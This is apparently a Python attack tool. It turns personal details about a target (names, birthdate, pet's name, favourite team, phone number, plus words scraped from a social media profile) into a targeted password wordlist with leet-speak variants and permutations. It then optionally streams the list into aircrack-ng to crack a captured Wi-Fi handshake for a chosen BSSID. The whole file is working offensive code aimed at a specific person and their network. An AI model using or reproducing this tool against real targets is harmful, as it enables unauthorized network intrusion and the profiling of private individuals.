import itertools
import json
import random
import requests
import subprocess
import sys
from bs4 import BeautifulSoup

leet_dict = {
    'a': ['@', '4'],
    'e': ['3'],
    'i': ['1', '!'],
    'o': ['0'],
    's': ['$', '5'],
    't': ['7'],
    '0': ['@'],
    '4': ['#']
}

def generate_variations(base_word):
    variations = {base_word, base_word.lower(), base_word.upper(), base_word.capitalize()}
    for letter, replacements in leet_dict.items():
        for rep in replacements:
            if letter in base_word:
                variations.add(base_word.replace(letter, rep))
    return list(variations)

def get_user_input():
    print("\n[+] Entrez les informations sur la cible (laisser vide si inconnu)\n")
    
    user_info = {
        "firstname": input("First Name : ").strip(),
        "lastname": input("Last Name : ").strip(),
        "nickname": input("Nickname : ").strip(),
        "birthdate": input(" Birth Date (YYYYMMDD) : ").strip(),
        "pet_name": input("Pet's name : ").strip(),
        "fav_color": input("Favorite Color : ").strip(),
        "fav_movie": input("Favorite movie : ").strip(),
        "fav_team": input("Favorite sport's team : ").strip(),
        "phone_number": input("Phone number : ").strip()
    }
    
    min_length = int(input("Min length of the password : ").strip() or "6")
    max_length = int(input("Max length of the password : ").strip() or "16")

    extra_words = input("\nEnter extra words (separated by comas, leave empty if no one) : ").strip()
    user_info["extra_words"] = [w.strip() for w in extra_words.split(",")] if extra_words else []

    return user_info, min_length, max_length

def scrape_social_data(profile_url):
    print(f"\n[+] Scraping : {profile_url}")
    try:
        response = requests.get(profile_url, headers={'User-Agent': 'Mozilla/5.0'})
        soup = BeautifulSoup(response.text, "html.parser")
        text_data = ' '.join([p.text for p in soup.find_all('p')])
        return text_data.split()
    except Exception as e:
        print(f"[-] Echec du scraping : {e}")
        return []

def generate_passwords(user_info, min_length, max_length):
    base_words = set()

    for key, value in user_info.items():
        if value:
            if isinstance(value, list):
                for v in value:
                    if v:
                        base_words.update(generate_variations(v))
            else:
                base_words.update(generate_variations(value))

    base_words = list(base_words)
    extra_words = user_info.get("extra_words", [])
    extra_combos = generate_extra_combinations(extra_words, max_len=5)

    for r in range(1, 6):
        for combo in itertools.permutations(base_words, r):
            base_combo = ''.join(combo)
            if min_length <= len(base_combo) <= max_length:
                yield base_combo

            for extra in extra_combos:
                for pattern in [
                    extra + base_combo,
                    base_combo + extra,
                    extra + base_combo + extra
                ]:
                    if min_length <= len(pattern) <= max_length:
                        yield pattern

def save_passwords(passwords):
    with open("passwords.txt", "w") as txt_file:
        txt_file.write("\n".join(passwords))
    
    with open("passwords.json", "w") as json_file:
        json.dump(passwords, json_file, indent=4)

    print(f"\n[+] Passwords saved in passwords.txt and passwords.json")

def generate_extra_combinations(extra_words, max_len=5):
    combos = set()
    for r in range(1, max_len + 1):
        for combo in itertools.product(extra_words, repeat=r):
            joined = ''.join(combo)
            combos.add(joined)
    return combos

def pipe_to_aircrack(password_generator, bssid, cap_file):
    print(f"\n[+] Running aircrack-ng in pipe mode...")

    try:
        proc = subprocess.Popen(
            ['aircrack-ng', '-w', '-', '-b', bssid, cap_file],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )

        # Lance un thread/loop pour lire l'output live
        def stream_output():
            for line in proc.stdout:
                if line:
                    print(line, end='')  # important de garder end='' pour gérer les \r

        import threading
        t = threading.Thread(target=stream_output)
        t.start()

        # Envoie les mots de passe ligne par ligne dans stdin
        for pwd in password_generator:
            try:
                proc.stdin.write(pwd + '\n')
            except BrokenPipeError:
                break  # probablement que aircrack a trouvé le mot de passe

        proc.stdin.close()
        t.join()
        proc.wait()

    except Exception as e:
        print(f"[-] Error while running aircrack-ng: {e}")


def main():
    user_info, min_length, max_length = get_user_input()

    profile_url = input("\nEnter the URL of a profil to scrap (leave empty if no one) : ").strip()
    if profile_url:
        scraped_words = scrape_social_data(profile_url)
        user_info["social_bio"] = scraped_words

    use_aircrack = input("\n[?] Voulez-vous lancer aircrack-ng en direct (sans enregistrer la wordlist) ? (y/n) : ").strip().lower()
    
    if use_aircrack == 'y':
        bssid = input("BSSID (MAC de la cible) : ").strip()
        cap_file = input("Fichier .cap du handshake : ").strip()
        pipe_to_aircrack(generate_passwords(user_info, min_length, max_length), bssid, cap_file)
    else:
        passwords = list(generate_passwords(user_info, min_length, max_length))
        print(f"\n[+] Number of generated words : {len(passwords)}")
        save_passwords(passwords)

if __name__ == "__main__":
    main()